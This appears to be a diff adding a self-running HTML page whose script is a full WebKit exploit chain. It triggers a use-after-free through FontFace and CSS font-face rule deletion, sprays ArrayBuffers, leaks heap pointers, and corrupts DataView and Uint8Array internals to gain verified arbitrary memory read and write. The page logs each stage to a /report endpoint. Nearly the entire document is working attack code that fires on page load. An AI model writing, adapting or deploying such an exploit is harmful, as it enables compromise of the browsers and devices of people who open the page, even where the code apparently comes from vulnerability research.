@@ -1,0 +1,221 @@
+<!doctype html><html><body style="margin:0;padding:10px;font-family:system-ui;background:#07090d;color:#cfe3ff">
+<button id="go" style="font-size:20px;padding:10px 22px;border-radius:10px">CHAIN WRITE</button>
+<pre id="o" style="font:12px/1.4 ui-monospace;white-space:pre-wrap;margin-top:8px"></pre>
+<script>
+var L=[],o=document.getElementById("o");
+function lg(s){o.textContent+=s+"\n";L.push(s);try{fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({ua:navigator.userAgent,lines:L})}).catch(function(){})}catch(e){}}
+function hx(a,b){return "0x"+("00000000"+(b>>>0).toString(16)).slice(-8)+("00000000"+(a>>>0).toString(16)).slice(-8)}
+var S=0xb8,F=0x28,FZ=0x30,FC=0x34,ST=0x7a;
+// P4 field map (webkit_3.12.11): JSArrayBufferView.h:223-225 (m_vector/m_length/m_mode), JSDataView.h:77 (m_buffer)
+var VV=0x10,VL=0x18,VM=0x20,VB=0x28;
+var ABL=0xde,TAL=0xee,WIN=0x1000;              // victim DataView byteLength / victim Uint8Array length / fake window
+var TA=0xda7a,TC=0xcafe,TU=0x51d8,TV=0x520b;   // victim tag words (hi 16 bits)
+var M0=0xc0deb00b,M1=0x1badb002;               // probe magic (pre-planted via d into the fake-face chunk)
+function w32(u,off,v){u[off]=v&255;u[off+1]=(v>>>8)&255;u[off+2]=(v>>>16)&255;u[off+3]=(v>>>24)&255}
+function r32(u,off){return (u[off]|u[off+1]<<8|u[off+2]<<16|u[off+3]<<24)>>>0}
+function add64(p,n){var t=p.lo+n;return{lo:t>>>0,hi:p.hi+(t>4294967295?1:0)}}
+function sub64(p,n){var t=p.lo-n;return{lo:t>>>0,hi:p.hi-(t<0?1:0)}}
+function ok64(p){return (p.hi>>>0)<=0x7f&&(p.lo>>>0)>=0x1000&&((p.lo>>>0)&7)===0}
+function u8(ab){return new Uint8Array(ab)}
+async function uaf(){
+ var n=0xb0,ab=[],ft=null,fa=null,st=document.createElement("style");
+ var r1="@font-face{font-family:s;src:local(systemfont);unicode-range:U+0043}";
+ var r2="@font-face{font-family:b;src:url(/font/crafted.otf);unicode-range:U+0042}";
+ var A=new FontFace("a","local(systemfont)",{unicodeRange:"U+0041"});
+ document.fonts.add(A);void A.loaded;document.head.append(st);
+ for(var i=0;i<n/4;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+ var u=st.sheet.cssRules.length;st.sheet.insertRule(r2,st.sheet.cssRules.length);
+ for(var i=n/4;i<n;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+ void document.body.offsetHeight;
+ var ot=FontFace.prototype.then;
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
+  if(this!==A)return;lg("[1] UAF");
+  st.sheet.deleteRule(u);void document.body.offsetHeight;
+  for(var i=st.sheet.cssRules.length-1;i>=0;i--){if(st.sheet.cssRules[i].cssText.indexOf("s;")>=0||st.sheet.cssRules[i].cssText.indexOf("spray")>=0)st.sheet.deleteRule(i)}
+  void document.body.offsetHeight;
+  for(var i=0;i<n;i++){var b=new ArrayBuffer(S),d=new DataView(b);d.setUint32(0x58,0,true);d.setUint32(0x5c,0,true);d.setUint32(8,1,true);d.setUint8(ST,3);ab.push(b)}
+  return undefined}});
+ var fs=null;try{fs=await document.fonts.load("1em a,b","AB")}catch(e){}
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:ot});
+ if(!fs||fs.length!==2)return null;
+ for(var i=0;i<fs.length;i++)if(fs[i].unicodeRange==="U+0-10FFFF")ft=fs[i];
+ for(var i=0;i<ab.length;i++)if(new DataView(ab[i]).getUint32(8,true)===2)fa=ab[i];
+ if(!ft||!fa)return null;
+ var d=new DataView(fa);
+ function sp(o2,a,b){d.setUint32(o2,a>>>0,true);d.setUint32(o2+4,b>>>0,true)}
+ function rd(a,b,sz){var r=new ArrayBuffer(sz),v=new Uint8Array(r),i=0;while(i<sz){sp(F,(a+i)>>>0,b);d.setInt32(FZ,1,true);d.setInt32(FC,1,true);var s=ft.featureSettings;for(var j=1;j<5&&i<sz;j++)v[i++]=s.charCodeAt(j)&255}return r}
+ return {f:ft,rd:rd,ab:fa,dv:d};
+}
+async function run(){
+ lg("CHAIN-WRITE "+navigator.userAgent);
+ var u=null;
+ try{u=await uaf();if(!u){lg("no primitive");return}}catch(e){lg("[uaf] threw: "+e.message);lg("done");return}
+ var d=u.dv,ft=u.f,rd=u.rd;
+ // --- S1: W/F/B pointer walk (chain-final verbatim) -> B = the fake-face chunk (fa) address
+ var W=null,Fp=null,Bp=null;
+ try{
+  var ww=rd(d.getUint32(0x60,true),d.getUint32(0x64,true),0x80);
+  var wv=new DataView(ww.buffer||new Uint8Array(ww).buffer);
+  W={lo:ww.byteLength?d.getUint32(0x60,true):0,hi:d.getUint32(0x64,true)};
+  Fp={lo:wv.getUint32(8,true),hi:wv.getUint32(12,true)};
+  var fw=rd(Fp.lo,Fp.hi,0x80); var fv=new DataView(fw.buffer||new Uint8Array(fw).buffer);
+  Bp={lo:fv.getUint32(0x30,true),hi:fv.getUint32(0x34,true)};
+  lg("[leak] W="+hx(W.lo,W.hi)+" F="+hx(Fp.lo,Fp.hi)+" B="+hx(Bp.lo,Bp.hi));
+ }catch(e){lg("[walk] threw: "+e.message);lg("done");return}
+ if((!Bp.lo&&!Bp.hi)||!ok64(Bp)){lg("[walk] bad B");lg("done");return}
+ try{
+  var bw=rd(Bp.lo,Bp.hi,0x80); var bv=new DataView(bw.buffer||new Uint8Array(bw).buffer);
+  function q(off){return hx(bv.getUint32(off,true),bv.getUint32(off+4,true))}
+  lg("[B] +0x08="+q(8)+" +0x28="+q(0x28)+" +0x30="+q(0x30)+" +0x40="+q(0x40)+" +0x58="+q(0x58)+" +0x7A="+bv.getUint8(0x7A));
+ }catch(e){lg("[B] walk threw: "+e.message)}
+ // --- S2: P4 victims: DataView(AB(0xde)) cells (primary) + Uint8Array(0xee) cells (bonus), tagged data
+ var dvas=[],uas=[],sab=[];
+ try{
+  for(var i=0;i<0x100;i++){
+   var ab=new ArrayBuffer(ABL),dv=new DataView(ab);
+   dv.setUint32(0,(TA<<16)|i,true);dv.setUint32(4,(TC<<16)|i,true);
+   dvas.push(dv);
+   var ua=new Uint8Array(TAL);
+   w32(ua,0,(TU<<16)|i);w32(ua,4,(TV<<16)|i);
+   uas.push(ua);
+  }
+  lg("[P4-spray] "+dvas.length+"x DataView(AB(0xde)) + "+uas.length+"x Uint8Array(0xee), tags "+hx(TA,TC)+" / "+hx(TU,TV));
+ }catch(e){lg("[P4-spray] threw: "+e.message);lg("done");return}
+ // --- S3: survivor churn (settle the victims before the hunt)
+ try{for(var r=0;r<3;r++){var junk=[];for(var j=0;j<0x400;j++)junk.push(new ArrayBuffer(0x30));junk=null}}catch(e){}
+ // --- S4: the cell hunt (phased windows around B; stride 16 = MarkedBlock atom, MarkedBlock.h:72)
+ // phases double as a bounded pool-map probe: a crash in phase N pins the pool edge (the rig logs phases 0..N-1)
+ var PH=[
+  {off:0x800,n:0x7800},          // [B+0x800,  B+0x8000)  — the proven-live spray neighborhood (chain-final tgt=B+0x1000)
+  {off:0x8000,n:0x38000},        // [B+0x8000, B+0x40000) — fresh bump-front blocks
+  {off:-0x8000,n:0x8000},        // [B-0x8000, B)         — below (pool-edge risk: crashes ARE telemetry)
+  {off:0x40000,n:0xc0000},       // [B+0x40000, B+0x100000)
+  {off:-0x40000,n:0x38000}       // [B-0x40000, B-0x8000)
+ ];
+ function hunt(sig,verify){
+  var tot=0,hits=0,CAP=0x18000;
+  for(var ph=0;ph<PH.length&&tot<CAP;ph++){
+   var p=PH[ph].off>=0?add64(Bp,PH[ph].off):sub64(Bp,-PH[ph].off);
+   var end=add64(p,PH[ph].n),np=0;
+   lg("[P4-scan] phase "+ph+" @"+hx(p.lo,p.hi)+"+0x"+PH[ph].n.toString(16)+(PH[ph].off<0?" (down)":" (up)"));
+   while((p.hi<end.hi||(p.hi===end.hi&&p.lo<end.lo))&&tot<CAP){
+    try{
+     var pa=add64(p,VL),qq=u8(rd(pa.lo,pa.hi,8));
+     if(qq[0]===(sig&255)&&qq[1]===0&&qq[2]===0&&qq[3]===0&&qq[4]===0&&qq[5]===0&&qq[6]===0&&qq[7]===0){
+      hits++;
+      var v=verify(p);
+      if(v){lg("[P4-scan] cell "+hx(p.lo,p.hi)+" — "+np+" probes this phase, "+tot+" total, "+hits+" signatures");return v}
+     }
+    }catch(e){}
+    p=add64(p,16);np++;tot++;
+   }
+   lg("[P4-scan] phase "+ph+" miss ("+np+" probes, "+tot+" total)");
+  }
+  return null;
+ }
+ function dvVerify(c){
+  try{
+   var st=u8(rd(c.lo,c.hi,0x30));
+   if(r32(st,8)!==0||r32(st,12)!==0)return null;              // butterfly must be 0 (JSArrayBufferView.cpp:61, :151)
+   if(r32(st,VM)!==3)return null;                              // m_mode == DataViewMode (JSArrayBufferView.h:57-87)
+   var A={lo:r32(st,VB),hi:r32(st,VB+4)};
+   if(!ok64(A))return null;                                    // JSDataView::m_buffer (JSDataView.h:77)
+   var abr=u8(rd(A.lo,A.hi,0x40));
+   var mv={lo:r32(st,VV),hi:r32(st,VV+4)};                     // stored m_vector
+   var offMD=-1;
+   for(var o2=8;o2<=0x28;o2+=8){if(r32(abr,o2)===mv.lo&&r32(abr,o2+4)===mv.hi){offMD=o2;break}} // byteOffset-0 view: AB.m_data == cell.m_vector (same stored bits)
+   if(offMD<0)return null;
+   var k=-1;
+   if(ok64(mv)){                                               // cage looks raw -> deref-verify the tags (mv = the backing R, mapped)
+    var dt=u8(rd(mv.lo,mv.hi,8));
+    if((r32(dt,0)>>>16)===TA&&(r32(dt,4)>>>16)===TC)k=r32(dt,0)&0xffff;
+    if(k<0||k>=dvas.length)return null;
+   }
+   return {c:c,A:A,st:st,offMD:offMD,mv:mv,k:k,cage:(ok64(mv)?"raw":"tagged")};
+  }catch(e){return null}
+ }
+ function uaVerify(c){
+  try{
+   var st=u8(rd(c.lo,c.hi,0x30));
+   if(r32(st,8)!==0||r32(st,12)!==0)return null;
+   if(r32(st,VM)!==0)return null;                              // m_mode == FastTypedArray
+   var mv={lo:r32(st,VV),hi:r32(st,VV+4)};
+   if(!ok64(mv))return null;
+   var dt=u8(rd(mv.lo,mv.hi,8));
+   if((r32(dt,0)>>>16)===TU&&(r32(dt,4)>>>16)===TV){var k=r32(dt,0)&0xffff;if(k<uas.length)return {c:c,st:st,mv:mv,k:k}}
+   return null;
+  }catch(e){return null}
+ }
+ var hit=null;
+ try{hit=hunt(ABL,dvVerify)}catch(e){lg("[P4-scan] threw: "+e.message)}
+ if(!hit){lg("[P4-scan] NO DataView cell in the scanned windows (widening knob = PH in source)");lg("done");return}
+ lg("[P4-cell] C="+hx(hit.c.lo,hit.c.hi)+" A="+hx(hit.A.lo,hit.A.hi)+" victim="+hit.k+" cage="+hit.cage+" offMD=+0x"+hit.offMD.toString(16));
+ if(hit.cage==="tagged"){
+  // F5 verdict: the closed build tags array pointers (ptrauth on m_vector, PtrTag.h:447-456) — the raw-m_vector route is PAC-dead.
+  lg("[P4-cage] stored m_vector is not a raw pointer — array-ptr tagging ACTIVE; corruption aborted (no crash), see PR_BODY B1 follow-up");
+  lg("done");return
+ }
+ var dva=dvas[hit.k];
+ // --- S5: corrupt the victim cell: m_vector = T, m_length = WIN (one free+reclaim write at C)
+ var T=add64(Bp,0x90);                                        // probe target inside the fake-face chunk (fa tail, inert Timer region)
+ try{d.setUint32(0x90,M0,true);d.setUint32(0x94,M1,true)}catch(e){lg("[P4-magic] threw: "+e.message)}
+ var pay=null;
+ try{pay=u8(rd(hit.c.lo,hit.c.hi,S))}catch(e){lg("[P4-copy] threw: "+e.message);lg("done");return}
+ w32(pay,VV,T.lo);w32(pay,VV+4,T.hi);                         // m_vector = T (raw; caging degenerates, Gigacage.h:31-32,:80-82)
+ w32(pay,VL,WIN);w32(pay,VL+4,0);                             // m_length = 0x1000 (u64) — removes the bounds compare
+ // m_mode(+0x20)=3 and m_buffer(+0x28) stay verbatim (faithful 0xb8 copy keeps the neighbor atoms intact)
+ try{
+  d.setUint32(F,hit.c.lo,true);d.setUint32(F+4,hit.c.hi,true);d.setInt32(FZ,1,true);d.setInt32(FC,1,true);
+  ft.featureSettings='"liga" 1';                              // ~VectorBuffer -> fastFree(C)  (Vector.h:427-430, wkcHeapFreePeer)
+ }catch(e){lg("[P4-free] threw: "+e.message)}
+ try{for(var i=0;i<0x80;i++){var ab2=new ArrayBuffer(S),wv2=new DataView(ab2);for(var j=0;j<S;j+=4)wv2.setUint32(j,r32(pay,j),true);sab.push(ab2)}}catch(e){lg("[P4-spray2] threw: "+e.message)}
+ // --- S6: the R/W proof (read / write / window)
+ var back=null;
+ try{back=u8(rd(hit.c.lo,hit.c.hi,0x30))}catch(e){}
+ if(!back||r32(back,VV)!==T.lo||r32(back,VV+4)!==T.hi){
+  var same=back&&r32(back,VV)===r32(hit.st,VV)&&r32(back,VV+4)===r32(hit.st,VV+4)&&r32(back,VM)===r32(hit.st,VM);
+  lg(same?"[P4-noreclaim] cell bytes unchanged — the 0xb8 reclaim did not land at C":"[P4-shape] cell bytes changed but the fake fields are not in place");
+  lg("done");return
+ }
+ var v0=null;try{v0=dva.getUint32(0,true)}catch(e){v0="throw:"+e.message}
+ if(v0===M0)lg("[P4-r] dva.getUint32(0)=0x"+(M0>>>0).toString(16)+" — JS-visible read through the raw m_vector at "+hx(T.lo,T.hi));
+ else{lg("[P4-shape] view read fails (getUint32(0)="+v0+") — fields right at C but the access path disagrees");lg("done");return}
+ var wok=false;try{dva.setUint32(0x20,M1,true);wok=true}catch(e){}
+ var wb=null;try{wb=u8(rd(T.lo,T.hi,0x28))}catch(e){}
+ if(wok&&wb&&r32(wb,0x20)===M1)lg("[P4-w] dva.setUint32(0x20) verified by rd() at "+hx(add64(T,0x20).lo,add64(T,0x20).hi)+" — FULL WRITE via the fake view");
+ else lg("[P4-wmiss] write did not verify (wok="+wok+")");
+ var v8=null;try{v8=dva.getUint32(0x800,true)}catch(e){v8="throw"}
+ if(v8==="throw")lg("[P4-bounds] index 0x800 still out-of-bounds — the fake m_length did not take effect");
+ else{
+  var x8=null;try{x8=u8(rd(add64(T,0x800).lo,add64(T,0x800).hi,4))}catch(e){}
+  if(x8&&r32(x8,0)===v8)lg("[P4-len] index 0x800 read matches rd() at "+hx(add64(T,0x800).lo,add64(T,0x800).hi)+" — bounds removed, window=0x"+WIN.toString(16));
+  else lg("[P4-len] far read ok but mismatch vs rd() (0x"+(v8>>>0).toString(16)+")");
+ }
+ // --- S7: bonus leg — the LLInt typed-array fast path on a Uint8Array victim (cage==raw only)
+ var hit2=null;
+ try{hit2=hunt(TAL,uaVerify)}catch(e){lg("[P4-scan2] threw: "+e.message)}
+ if(!hit2){lg("[P4-ta] no Uint8Array cell in the windows — bonus leg skipped");lg("done");return}
+ lg("[P4-tacell] C2="+hx(hit2.c.lo,hit2.c.hi)+" victim="+hit2.k);
+ var pay2=null;
+ try{pay2=u8(rd(hit2.c.lo,hit2.c.hi,S));w32(pay2,VV,T.lo);w32(pay2,VV+4,T.hi);w32(pay2,VL,WIN);w32(pay2,VL+4,0)}catch(e){lg("[P4-copy2] threw: "+e.message);lg("done");return}
+ try{
+  d.setUint32(F,hit2.c.lo,true);d.setUint32(F+4,hit2.c.hi,true);d.setInt32(FZ,1,true);d.setInt32(FC,1,true);
+  ft.featureSettings='"liga" 1';
+ }catch(e){lg("[P4-free2] threw: "+e.message)}
+ try{for(var i=0;i<0x80;i++){var ab3=new ArrayBuffer(S),wv3=new DataView(ab3);for(var j=0;j<S;j+=4)wv3.setUint32(j,r32(pay2,j),true);sab.push(ab3)}}catch(e){}
+ var ua2=uas[hit2.k],ta0=null;
+ try{ta0=(ua2[0]|ua2[1]<<8|ua2[2]<<16|ua2[3]<<24)>>>0}catch(e){}
+ if(ta0===M0){
+  lg("[P4-ta] Uint8Array victim reads the raw m_vector (LLInt fast path, LowLevelInterpreter.asm:1346-1380) — typed-array R/W live");
+  var tw=false;try{ua2[0x20]=0x41;tw=true}catch(e){}
+  var tb=null;try{tb=u8(rd(add64(T,0x20).lo,add64(T,0x20).hi,1))}catch(e){}
+  if(tw&&tb&&tb[0]===0x41)lg("[P4-taw] ua[0x20]=0x41 verified by rd() — typed-array WRITE live");
+ }else{
+  var back2=null;try{back2=u8(rd(hit2.c.lo,hit2.c.hi,0x30))}catch(e){}
+  lg(back2&&r32(back2,VV)===T.lo?"[P4-tashape] C2 patched but the typed-array access path disagrees":"[P4-tanoreclaim] second reclaim missed C2");
+ }
+ sab=null; // drop the spray refs
+ lg("done");
+}
+document.getElementById("go").addEventListener("click",run);run();
+</script></body></html>
